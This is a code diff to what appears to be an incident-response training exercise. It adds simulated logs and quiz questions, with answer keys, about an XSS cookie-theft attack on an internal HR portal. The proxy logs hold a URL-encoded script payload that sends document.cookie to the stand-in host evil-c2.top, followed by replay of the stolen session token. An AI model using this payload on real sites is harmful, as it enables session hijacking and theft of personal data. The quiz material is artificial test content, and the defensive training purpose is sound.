@@ -4,14 +4,15 @@ scenarios.push({
     description: "Suspicious script payloads detected in search-query parameters of the internal employee portal, followed by unauthorized session activity.",
     logs: {
         proxy: [
-            "2026-06-01T08:15:20Z - IP: 192.168.10.10 - URL: https://portal.company.local/search?q=benefits - Action: Allowed - Category: Internal Portal - Status: 200 - Bytes: 12500",
+            "2026-06-01T08:15:20Z - IP: 192.168.10.88 - URL: https://portal.company.local/search?q=benefits - Action: Allowed - Category: Internal Portal - Status: 200 - Bytes: 12500",
             "2026-06-01T08:22:45Z - IP: 192.168.10.14 - URL: https://github.com/company-org/frontend - Action: Allowed - Category: IT/Development - Status: 200 - Bytes: 45200",
             "2026-06-01T08:35:10Z - IP: 192.168.10.88 - URL: https://portal.company.local/search?q=holiday_schedule - Action: Allowed - Category: Internal Portal - Status: 200 - Bytes: 11200",
             "2026-06-01T08:50:10Z - IP: 192.168.10.33 - URL: https://portal.company.local/search?q=%3Cscript%3Enew%20Image().src='http://evil-c2.top/log?c='%2Bdocument.cookie;%3C/script%3E - Action: Allowed - Category: Internal Portal - Status: 200 - Bytes: 14500",
             "2026-06-01T08:50:11Z - IP: 192.168.10.33 - URL: http://evil-c2.top/log?c=session_id=A9F3B211X_HR_ADMIN - Action: Allowed - Category: Uncategorized - Status: 200 - Bytes: 43",
             "2026-06-01T08:55:00Z - IP: 192.168.10.10 - URL: https://slack.com/api/rtm.start - Action: Allowed - Category: Business/Collaboration - Status: 200 - Bytes: 3100",
             "2026-06-01T09:05:00Z - IP: 203.0.113.88 - URL: https://portal.company.local/api/hr/employee_pii_export - Action: Allowed - Category: Internal Portal - Status: 200 - Cookie: session_id=A9F3B211X_HR_ADMIN - Bytes: 4500000",
-            "2026-06-01T09:12:15Z - IP: 192.168.10.88 - URL: https://portal.company.local/dashboard - Action: Allowed - Category: Internal Portal - Status: 200 - Bytes: 24000"
+            "2026-06-01T09:12:15Z - IP: 192.168.10.88 - URL: https://portal.company.local/dashboard - Action: Allowed - Category: Internal Portal - Status: 200 - Bytes: 24000",
+            "2026-06-01T09:20:00Z - IP: 192.168.10.10 - URL: https://canva.com/design - Action: Allowed - Category: Media/Arts - Status: 200 - Bytes: 452000"
         ],
         email: [
             "2026-06-01T08:00:10Z - Inbound - From: notifications@slack.com - To: mrogers@company.com - Subject: Daily Team Sync - Status: Delivered",
@@ -22,11 +23,15 @@ scenarios.push({
         file_server: [
             "2026-06-01T08:20:15Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
             "2026-06-01T08:21:05Z - Object Accessed: \\\\FILE-SRV-01\\Public\\Templates\\Onboarding_Guide.pdf - Accesses: ReadData - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
+            "2026-06-01T08:48:00Z - Share Name: \\\\FILE-SRV-01\\Finance - Access Request: Allowed - Source IP: 192.168.10.12 - User: COMPANY\\fsmith",
+            "2026-06-01T08:49:15Z - Object Accessed: \\\\FILE-SRV-01\\Finance\\Ledger2026.xlsx - Accesses: ReadData, WriteData - Source IP: 192.168.10.12 - User: COMPANY\\fsmith",
             "2026-06-01T09:15:20Z - Share Name: \\\\FILE-SRV-01\\DevShare - Access Request: Allowed - Source IP: 192.168.10.14 - User: COMPANY\\rjones"
         ],
         workstations: [
+            "2026-06-01T08:01:22Z - WKSTN-01 (192.168.10.10) - EventID: 4688 - Process Created: explorer.exe spawned slack.exe --startup",
             "2026-06-01T08:15:00Z - WKSTN-01 (192.168.10.10) - EventID: 4688 - Process Created: explorer.exe spawned chrome.exe",
             "2026-06-01T08:35:05Z - WKSTN-08 (192.168.10.88) - EventID: 4688 - Process Created: explorer.exe spawned outlook.exe",
+            "2026-06-01T08:48:30Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: explorer.exe spawned excel.exe \"\\\\FILE-SRV-01\\Finance\\Ledger2026.xlsx\"",
             "2026-06-01T08:50:10Z - WKSTN-33 (192.168.10.33) - EventID: 4688 - Process Created: outlook.exe spawned chrome.exe --url https://portal.company.local/search?q=%3Cscript...",
             "2026-06-01T09:00:15Z - WKSTN-33 (192.168.10.33) - EventID: 7036 - Service Status Change: Windows Update Service entered the running state.",
             "2026-06-01T09:12:00Z - WKSTN-03 (192.168.10.14) - EventID: 4688 - Process Created: explorer.exe spawned vscode.exe"
@@ -35,6 +40,8 @@ scenarios.push({
             "2026-06-01T08:00:15Z - WKSTN-01 (192.168.10.10) - EventID: 4624 - Successful Logon - User: COMPANY\\asmith - Logon Type: 2 (Interactive)",
             "2026-06-01T08:05:00Z - IdP_Auth - User: mrogers@company.com - App: O365 Portal - AuthMethod: Password+MFA - Status: Success - IP: 192.168.10.33",
             "2026-06-01T08:10:00Z - WKSTN-08 (192.168.10.88) - EventID: 4624 - Successful Logon - User: COMPANY\\jdoe - Logon Type: 2 (Interactive)",
+            "2026-06-01T08:15:00Z - WKSTN-03 (192.168.10.14) - EventID: 4624 - Successful Logon - User: COMPANY\\rjones - Logon Type: 2 (Interactive)",
+            "2026-06-01T08:45:10Z - WKSTN-02 (192.168.10.12) - EventID: 4624 - Successful Logon - User: COMPANY\\fsmith - Logon Type: 2 (Interactive)",
             "2026-06-01T09:05:00Z - Portal_Auth - User: mrogers@company.com - App: Internal HR Portal - AuthMethod: Session_Token - Status: Success - IP: 203.0.113.88 - Note: Anomalous external IP authenticating with active session token"
         ]
     },
@@ -45,10 +52,21 @@ scenarios.push({
             options: [
                 "An unauthenticated SQL injection exploit on the public web gateway",
                 "A spear-phishing email containing a crafted, malicious URL link",
-                "A malicious document attachment executing macros",
-                "A supply chain compromise of the portal's JavaScript libraries"
+                "A malicious document attachment disguised as an internal policy update",
+                "A drive-by browser vulnerability executing code via malicious advertisements"
             ],
             correct: "A spear-phishing email containing a crafted, malicious URL link"
+        },
+        origin: {
+            label: "Identify the internal host utilized by the victim during the initial execution phase (Patient Zero):",
+            type: "select",
+            options: [
+                "WKSTN-01",
+                "WKSTN-02",
+                "WKSTN-08",
+                "WKSTN-33"
+            ],
+            correct: "WKSTN-33"
         },
         hijack: {
             label: "How did the attacker bypass authentication to access the sensitive /api/hr/employee_pii_export endpoint?",
